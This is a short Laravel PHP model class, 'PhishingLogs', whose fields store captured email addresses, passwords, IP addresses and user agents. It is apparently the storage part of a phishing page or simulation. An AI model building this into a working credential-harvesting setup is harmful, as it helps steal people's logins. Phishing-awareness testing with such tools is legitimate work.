<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Factories\HasFactory;

class PhishingLogs extends Model
{
    use HasFactory;

    protected $fillable = [
        'email',
        'password',
        'ip_address',
        'user_agent',
    ];
}